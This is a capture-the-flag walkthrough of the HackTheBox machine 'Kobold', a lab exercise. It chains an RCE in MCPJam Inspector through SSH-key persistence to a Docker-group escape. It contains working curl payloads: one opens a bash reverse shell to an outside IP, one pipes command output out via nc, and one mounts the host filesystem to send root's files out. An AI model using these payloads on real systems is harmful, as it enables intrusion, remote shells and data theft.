# HackTheBox Kobold Full Chain Penetration Testing

## External Reconnaissance and Web Entry
- Target Identification: Mapping IP address to `kobold.htb` for initial web access.
- Vhost Enumeration: Executing `gobuster vhost --append-domain` to discover subdomains.
- Endpoint Discovery: Successful identification of `bin.kobold.htb` and `mcp.kobold.htb`.
## Exploitation and Initial Access
- Vulnerability Analysis: Identifying an outdated version of MCPJam Inspector v1.4.2 on `mcp.kobold.htb`.
- CVE-2026-23744: Exploiting a critical vulnerability in the MCP API to achieve Remote Code Execution (RCE).
- Payload Delivery: Utilizing `curl` to inject a malicious JSON configuration into the `/api/mcp/connect` endpoint.
## Reverse shell
		curl -k https://mcp.kobold.htb:443/api/mcp/connect \
		-H "Content-Type: application/json" \
		-d '{
			"serverConfig": {
				"command":"/bin/bash",
				"args":["-c", "bash -i >& /dev/tcp/10.10.15.175/4444 0>&1"],
				"env":{}
			},
			"serverId":"rev_shell"
		}'
			
Establishing a callback to `10.10.15.175:4444` via bash interactive shell.

## Persistence and Stabilization
- SSH Key Injection: Generating and hosting a public RSA key via a local HTTP server.
- Credential Placement: Deploying the public key into the target user’s `.ssh/authorized_keys` directory.
- Stable Connection: Establishing a persistent SSH session to replace the volatile reverse shell.


## Post-Exploitation and Lateral Movement
- Privilege Enumeration: Searching the filesystem for SUID binaries using `find / -perm -u=s -type f`.
- Ownership Analysis: Identifying `operator` group ownership and permissions over PrivateBin sensitive files.
## Docker escape
- Docker images analysis: Searching for installed docker images
  
		curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
		-H "Content-Type: application/json" \
		-d '{
			"serverConfig": {
				"command": "sg",
		    	"args": ["docker", "-c", "docker images | nc 10.10.15.124 4444"],
		    	"env": {}
			},
			"serverId": "docker"
		}'
# Final exploitation
creating new Docker container using enumerated service image, and mounting `/` as `/exp`, which allows to read every system file, including `/root/root.txt` leading to flag compromise
  
		curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
		-H "Content-Type: application/json" \
		-d '{
		  "serverConfig": {
		    "command": "sg",
		    "args": ["docker", "-c", "docker run -u root -v /:/exp --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /exp/root/root.txt | nc -w 10 10.10.15.124 4444"],    
		    "env": {}
		  },
		  "serverId": "flagattempt3"
		}'
`--rm` flag may be used to delete Docker container after exploit execution, however its not nescessary
